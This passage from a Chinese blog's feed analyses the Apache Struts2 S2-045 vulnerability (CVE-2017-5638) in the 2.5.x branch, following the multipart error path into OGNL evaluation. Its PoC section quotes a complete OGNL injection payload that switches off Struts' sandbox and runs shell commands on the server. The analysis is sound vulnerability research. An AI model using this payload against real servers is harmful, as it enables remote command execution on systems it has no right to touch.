  &lt;li&gt;拨打电话权限，允许程序从非系统拨号器里输入电话号码：  android.permission.CALL_PHONE&lt;/li&gt;
  &lt;li&gt;通话权限，允许程序拨打电话，替换系统的拨号器界面：android.permission.CALL_PRIVILEGED&lt;/li&gt;
  &lt;li&gt;处理拨出电话，允许程序监视，修改或放弃播出电话：android.permission.PROCESS_OUTGOING_CALLS&lt;/li&gt;
  &lt;li&gt;获取通讯录内容权限：android.permission.READ_CONTACTS&lt;/li&gt;
  &lt;li&gt;获取网络状态权限：android.permission.ACCESS_NETWORK_STATE&lt;/li&gt;
  &lt;li&gt;获取粗略定位权限：android.permission.ACCESS_COARSE_LOCATION&lt;/li&gt;
  &lt;li&gt;获取精确定位权限：android.permission.ACCESS_FINE_LOCATION&lt;/li&gt;
  &lt;li&gt;访问Internet权限：android.permission.INTERNET&lt;/li&gt;
  &lt;li&gt;录音权限：android.permission.RECORD_AUDIO&lt;/li&gt;
  &lt;li&gt;扩展存储（SD卡）写权限：android.permission.WRITE_EXTERNAL_STORAGE&lt;/li&gt;
  &lt;li&gt;操控相机权限：android.permission.CAMERA&lt;/li&gt;
  &lt;li&gt;开机启动权限：android.permission.RECEIVE_BOOT_COMPLETED&lt;/li&gt;
  &lt;li&gt;操控手机震动权限：android.permission.VIBRATE&lt;/li&gt;
&lt;/ul&gt;

</content>
 </entry>
 
 <entry>
   <title>也谈S2-045</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/03/21/%E4%B9%9F%E8%B0%88S2-045.html"/>
   <updated>2017-03-21T02:04:34+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/03/21/也谈S2-045</id>
   <content type="html">&lt;h2 id=&quot;0x00-序&quot;&gt;0x00 序&lt;/h2&gt;

&lt;p&gt;2017年3月7日Struts的S2-045漏洞掀起了一波热潮，刚好休年假出去玩，没有赶上这波，回来赶紧学习各位师傅的文章知识点。网上的分析文章基本上保持了只传PoC，漏洞分析抄官网漏洞描述的炒作风格，能找到的仅有下面这三篇有价值的漏洞分析文章。&lt;/p&gt;

&lt;p&gt;seebug的&lt;a href=&quot;http://paper.seebug.org/241/&quot;&gt;《S2-045 原理初步分析（CVE-2017-5638）》&lt;/a&gt;和&lt;a href=&quot;http://paper.seebug.org/247/&quot;&gt;《S2-045 漏洞分析》&lt;/a&gt;通过对比版本差异分析出漏洞问题的形成，内容上基本大同小异，后一篇比前一篇详细一点。第二篇主要还是在findText、translateVariables这些工具方法上纠结个不停，与其说是漏洞分析，倒不如说是Ognl执行流程分析。其实如果你跟多一些Strut2的Ognl相关漏洞，就会养成对LocalizedTextUtil下方法警觉的习惯，也会对它们执行Ognl表达式的流程烂熟于胸。&lt;/p&gt;

&lt;p&gt;还有隐形人真忙的&lt;a href=&quot;http://blog.csdn.net/u011721501/article/details/60768657&quot;&gt;《s2-045漏洞分析》&lt;/a&gt;，这才是一篇真正的漏洞分析，一看就是老司机，入口点直指要害，执行逻辑描述的简单直接毫不拖沓。不过应该是作者只是匆匆一瞥，分析的流程只是2.3.x系列的逻辑，2.5.x系列的漏洞与他所描述的稍有不同。&lt;/p&gt;

&lt;p&gt;这篇文章我会针对2.5.x系列的漏洞执行流程进行描述，当做隐形人真忙的补充篇。在这之后我会简单分析下这次流出的PoC为什么可以绕过Struts的检查，成功的执行表达式。&lt;/p&gt;

&lt;h2 id=&quot;0x01-漏洞分析25x系列版本篇&quot;&gt;0x01 漏洞分析（2.5.x系列版本篇）&lt;/h2&gt;

&lt;p&gt;形成漏洞的主要原因是处理POST提交multipart/form-data类型的请求过于草率的将带有用户可控内容的错误信息交由Ognl表达式处理，从而造成Ognl表达式代码执行。我们直接来看request请求的解包代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wrapRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// don't wrap more than once&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrutsRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;MultiPartRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getMultiPartRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;LocaleProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getContainer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocaleProvider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MultiPartRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mpr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getSaveDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disableRequestAttributeValueStackLookup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrutsRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disableRequestAttributeValueStackLookup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;判断content_type字段中有没有multipart/form-data字样，有的话就进入了解析逻辑，后面的MultiPartRequestWrapper会通过JakartaMultiPartRequest的parse方法解析multi-part相关的数据（也包含content_type字段中的内容）。如果解析过程中出现问题（比如不符合协议规范）会触发catch流程，向MultiPartRequestWrapper对象插入异常信息。这个地方就是和隐形人真忙分析的2.3.x系列不同的地方，在2.3系列中这里就通过JakartaMultiPartRequest的buildErrorMessage方法直接调用了LocalizedTextUtil的findText方法执行了Ongl。而在2.5.x系列中，buildErrorMessage方法只是构建错误信息字符串，然后插到MultiPartRequestWrapper对象中，猜测应该是官方觉得文件上传部分的错误信息应该统一放到FileUploadInterceptor中处理，避免不同的解析插件错误信息返回不一致。以下为JakartaMultiPartRequest的parse方法代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;saveDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;setLocale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processUpload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;saveDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileUploadException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;LOG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Request exceeded size limit!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;LocalizedMessage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileUploadBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SizeLimitExceededException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;FileUploadBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SizeLimitExceededException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileUploadBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SizeLimitExceededException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildErrorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getPermittedSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActualSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()});&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildErrorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{});&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;LOG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unable to parse request&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;LocalizedMessage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildErrorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{});&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;再向后走到FileUploadInterceptor中我们就可以发现如下代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;MultiPartRequestWrapper&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;multiWrapper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MultiPartRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;multiWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasErrors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalizedMessage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;multiWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getErrors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;validation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;validation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addActionError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalizedTextUtil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTextKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ActionContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLocale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getArgs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这里就是将MultiPartRequestWrapper对象request中的所有error信息遍历出来添加到validation变量中，而添加的过程中就用到了LocalizedTextUtil的findText方法，其中第4个参数会到达我们熟悉的TextParseUtil的translateVariables方法，即作为Ognl表达式执行。&lt;/p&gt;

&lt;h2 id=&quot;0x02-poc分析&quot;&gt;0x02 PoC分析&lt;/h2&gt;

&lt;p&gt;各大网站关于S2-045都贴出了带有下面PoC的利用代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这段利用代码我第一看到时感觉很不解，为什么这样就可以绕过Struts的Ognl表达式执行校验了？因为在Struts官方修复S2-037这个漏洞时已经限制了OgnlUtil类中的getvalue方法（translateVariables的底层也是getvalue），使其无法继续执行多语句的Ognl表达式了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-03/compare.png&quot; alt=&quot;compare&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们对比来看getvalue执行ognl的必经之路compileAndExecute方法：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;compileAndExecute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OgnlTask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OgnlException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enableExpressionCache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
